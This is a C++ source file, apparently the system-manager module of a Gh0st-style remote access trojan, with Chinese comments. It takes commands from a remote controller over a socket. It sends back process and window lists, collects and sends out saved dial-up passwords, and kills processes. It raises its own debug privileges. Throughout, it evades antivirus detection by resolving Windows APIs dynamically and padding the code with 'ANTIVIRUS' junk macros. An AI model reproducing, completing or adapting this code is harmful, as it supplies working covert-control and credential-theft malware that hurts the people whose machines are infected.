// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "SystemManager.h"
#include "Dialupass.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")

#include "until.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef BOOL (WINAPI *Process32FirstT)
(
 HANDLE hSnapshot,
 LPPROCESSENTRY32 lppe
 );

typedef HANDLE (WINAPI *CreateToolhelp32SnapshotT)
(
 DWORD dwFlags,
 DWORD th32ProcessID
 );



typedef BOOL (WINAPI *Process32NextT)
(
 HANDLE hSnapshot,
 LPPROCESSENTRY32 lppe
 );
Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary("kernel32.dll"),"Process32Next");

CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
}

CSystemManager::~CSystemManager()
{

}
void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:
		SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	default:
		break;
	}
}

void CSystemManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemManager::SendWindowsList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);	
}
void CSystemManager::SendDialupassList()
{
	CDialupass	pass;
	
	int	nPacketLen = 0;
	for (int i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}
	
	nPacketLen += 1;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLen);
	
	DWORD	dwOffset = 1;
	
	for (i = 0; i < pass.GetMax(); i++)
	{
		
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
		{
			int	nFieldLength = lstrlen(pOneInfo->Get(j)) + 1;
			memcpy(lpBuffer + dwOffset, pOneInfo->Get(j), nFieldLength);
			dwOffset += nFieldLength;
		}
	}
	
	lpBuffer[0] = TOKEN_DIALUPASS;
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	
}
void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	HANDLE hProcess = NULL;
	
	//没必要提升到Debug权限杀进程!杀进程本来就是鸡肋.
	//DebugPrivilege(SE_DEBUG_NAME, TRUE);
	//DebugPrivilege(SE_DEBUG_NAME, FALSE);
	for (int i = 0; i < nSize; i += 4)
	{
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	// 稍稍Sleep下，防止出错
	Sleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	SendWindowsList();	
}

LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = {0};
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = {0};
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	ANTIVIRUS
	ElevationPrivilege(SE_DEBUG_NAME);
	ANTIVIRUS
CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateToolhelp32Snapshot");
	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	ANTIVIRUS

	if(hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	
	lpBuffer[0] = TOKEN_PSLIST;
	dwOffset = 1;
	
	HMODULE mHodule = LoadLibrary("PSAPI.dll");
	typedef BOOL (WINAPI *EnumProcessModulesT)(HANDLE,HMODULE *,DWORD,LPDWORD);
	ANTIVIRUS
	EnumProcessModulesT pEnumProcessModules=(EnumProcessModulesT)GetProcAddress(mHodule,"EnumProcessModules");
	ANTIVIRUS

	typedef DWORD (WINAPI *GetModuleFileNameExT)	(HANDLE,HMODULE,LPSTR,DWORD);
	ANTIVIRUS
	GetModuleFileNameExT pGetModuleFileNameEx=(GetModuleFileNameExT)GetProcAddress(mHodule,"GetModuleFileNameExA");
	ANTIVIRUS
Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary("kernel32.dll"),"Process32First");
	if(pProcess32First(hSnapshot, &pe32))
	{	  
		do
		{      
			ANTIVIRUS
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			ANTIVIRUS

			if ((pe32.th32ProcessID !=0 ) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				ANTIVIRUS

				pEnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				ANTIVIRUS
				pGetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				ANTIVIRUS
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	
				
				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;
				
				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		}

		while(pProcess32Next(hSnapshot, &pe32));
	}
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	ElevationPrivilege(SE_DEBUG_NAME); 
	
	CloseHandle(hSnapshot);
	return lpBuffer;	
}

bool CSystemManager::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	
	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}
	
	CloseHandle(hToken);
	return bResult;	
}
void CSystemManager::ShutdownWindows( DWORD dwReason )
{
	ElevationPrivilege(SE_SHUTDOWN_NAME);
	ExitWindowsEx(dwReason, 0);
	ElevationPrivilege(SE_SHUTDOWN_NAME);	
}


bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024];
	ANTIVIRUS
	memset(strTitle, 0, sizeof(strTitle));
	ANTIVIRUS
	GetWindowText(hwnd, strTitle, sizeof(strTitle));
	ANTIVIRUS
	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;
	
	ANTIVIRUS
	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
	ANTIVIRUS
	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	ANTIVIRUS
	dwOffset = LocalSize(lpBuffer);
	ANTIVIRUS
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	ANTIVIRUS
	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	ANTIVIRUS
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
	ANTIVIRUS
	*(LPBYTE *)lParam = lpBuffer;

	return true;
}

LPBYTE CSystemManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;

	ANTIVIRUS
	HMODULE mHodule = LoadLibrary("user32.dll");
	ANTIVIRUS
	typedef BOOL (WINAPI *EnumWindowsT)(WNDENUMPROC,LPARAM);
	ANTIVIRUS
	EnumWindowsT pEnumWindows = (EnumWindowsT)GetProcAddress(mHodule,"EnumWindows");
	ANTIVIRUS
	pEnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	ANTIVIRUS
	
	lpBuffer[0] = TOKEN_WSLIST;

	return lpBuffer;	
}
